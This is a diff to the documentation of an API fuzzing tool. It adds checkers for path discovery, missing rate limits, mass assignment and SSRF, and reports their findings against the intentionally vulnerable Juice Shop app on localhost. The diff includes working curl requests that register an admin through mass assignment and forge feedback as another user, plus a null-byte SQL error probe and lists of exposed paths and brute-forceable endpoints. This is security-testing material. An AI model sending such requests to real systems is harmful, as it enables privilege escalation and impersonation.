@@ -708,6 +708,9 @@ PASS: zero findings triggered by 401/403 (auth rejections correctly excluded)
 | `BehavioralPatterns` | ~55 | Node.js stack trace in 500 response |
 | `InvalidDynamicObject` | ~20 | `DELETE /api/Addresss/` → 500 (empty path param) |
 | `LeakageRule` | 0–2 | POST 4xx on singleton endpoint (with path params) leaves readable state |
+| `PathDiscovery` | 1–3 | `/metrics` — Prometheus endpoint unauthenticated (J20) |
+| `RateLimitChecker` | 3–8 | `/rest/user/login` — HIGH: 8 rapid requests, none returned 429 |
+| `MassAssignment` | 1–3 | `POST /api/Users` — fields `role:admin` accepted without 422 |
 
 **High-severity finding (reproducible):**
 ```
@@ -721,6 +724,76 @@ curl -v -X GET 'http://localhost:3000/rest/products/search?q=%00'
 
 `%00` (null byte) reaches the SQLite query unescaped → `SQLITE_ERROR` leaks
 in the response body, confirming missing input sanitisation.
+
+---
+
+## New Checkers — Juice Shop Integration
+
+### PathDiscovery (runs automatically before fuzzing loop)
+
+Juice Shop exposes several endpoints not in the main spec:
+
+| Path | Finding | Juice Shop challenge |
+|------|---------|---------------------|
+| `/metrics` | HIGH — Prometheus metrics unauthenticated | Exposed Metrics (J20) |
+| `/ftp` | MEDIUM — file server accessible | Confidential Document (J17) |
+| `/support/logs` | MEDIUM — access logs exposed | Access Log challenge |
+| `/security.txt` | INFO — security policy | Security Policy challenge |
+
+```bash
+# Extend PathDiscovery with Juice Shop-specific paths:
+cat > /tmp/juice-shop-paths.txt << 'EOF'
+/ftp                    FTP-style file server with customer data
+/ftp/acquisitions.md    Confidential acquisition document
+/support/logs           Support log files
+/video                  Promotional video endpoint
+EOF
+
+./shelob-ng \
+  -spec     juice-shop.openapi.json \
+  -url      http://localhost:3000 \
+  -user     fuzzer@shelob.local -password Shelob1! \
+  -path-wordlist /tmp/juice-shop-paths.txt \
+  -csp-disable -duration 5m -output results/pathscan_extended
+```
+
+### RateLimitChecker
+
+Juice Shop has no rate limiting on any endpoint.
+
+| Endpoint | Finding severity | Challenge |
+|---------|-----------------|---------|
+| `POST /rest/user/login` | **HIGH** | Password Strength (brute-forceable) |
+| `POST /api/Users` | **HIGH** | Registration brute-force |
+| `POST /rest/user/reset-password` | **HIGH** | OTP bypass |
+| All others | MEDIUM | General rate limit absence |
+
+### MassAssignment
+
+Juice Shop vulnerable endpoints:
+
+```bash
+# J13: Admin Registration — add "role":"admin" to POST /api/Users
+curl -X POST http://localhost:3000/api/Users \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"test@test.com","password":"Test1!","passwordRepeat":"Test1!",
+       "role":"admin",
+       "securityQuestion":{"id":1,"question":"?"},"securityAnswer":"x"}'
+# MassAssignment checker: sends this automatically and checks if role:admin appears in response
+
+# J16: Forged Feedback — inject UserId
+curl -X POST http://localhost:3000/api/Feedbacks \
+  -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer $JWT" \
+  -d '{"comment":"test","rating":5,"UserId":1}'
+# Sends as another user's feedback
+```
+
+### SSRF Mutator
+
+Juice Shop doesn't have obvious URL-accepting fields in its spec, so SSRF mutator
+returns `StrategyNotApplicable` for most requests. However, image upload endpoints
+(`/profile/image/url`) accept URL values — SSRF payloads will be injected there.
 
 ---
 
